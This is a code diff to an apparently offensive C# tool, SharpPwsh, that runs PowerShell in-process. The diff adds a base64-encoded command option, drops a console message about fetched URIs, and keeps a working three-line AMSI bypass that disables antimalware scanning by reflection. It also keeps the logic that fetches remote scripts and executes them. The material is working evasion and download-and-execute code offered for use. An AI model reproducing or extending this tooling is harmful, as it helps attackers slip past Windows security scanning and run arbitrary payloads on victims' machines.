@@ -4,6 +4,7 @@ using System.Linq;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Net;
+using System.Text;
 using CommandLine;
 
 // need to add as reference:
@@ -21,6 +22,8 @@ namespace SharpPwsh
             public  IEnumerable<string> inputUri { get; set; }
             [Option('b', "bypass-amsi", Required = false, HelpText = "Bypass AMSI")]
             public bool bypassAmsi { get; set; }
+            [Option('e', "encoded", Required = false, HelpText = "Encodeded command (base64)")]
+            public bool encodedCmd { get; set; }
         }
         static void Main(string[] args)
         {
@@ -29,11 +32,13 @@ namespace SharpPwsh
                 IEnumerable<string> inputCmds = o.inputCmds;
                 IEnumerable<string> inputURIs = o.inputUri;
                 bool bypassAmsi = o.bypassAmsi;
+                bool encodedCmd = o.encodedCmd;
                 List<string> cmds = new List<string>();
                 
                 // bypass amsi
                 if (bypassAmsi)
                 {
+                    // using powershell to avoid p/d invoke
                     cmds.Add("$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \"*iUtils\") {$c=$b}}");
                     cmds.Add("$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like \"*InitFailed\") {$f=$e}}");
                     cmds.Add("$f.SetValue($null,$true)");
@@ -42,7 +47,6 @@ namespace SharpPwsh
                 // fetch remote script and execute
                 foreach (string inputURI in inputURIs)
                 {
-                    Console.WriteLine("fetch " + inputURI);
                     string aCmd = FetchURI(inputURI);
                     cmds.Add(aCmd);
                 }
@@ -50,11 +54,24 @@ namespace SharpPwsh
                 // add input commands
                 foreach (string cmd in inputCmds)
                 {
-                    cmds.Add(cmd);
+                    if (encodedCmd)
+                    {
+                        byte[] d = Convert.FromBase64String(cmd);
+                        string n = Encoding.ASCII.GetString(d);
+                        // trim null terminators
+                        n = n.Replace("\0", string.Empty);
+                        cmds.Add(n);
+                    }
+                    else
+                    {
+                        cmds.Add(cmd);
+                    }
                 }
                 
                 ExecutePwsh(cmds);
             });
+
+            return;
         }
         public static void ExecutePwsh(List<string> cmds)
         {
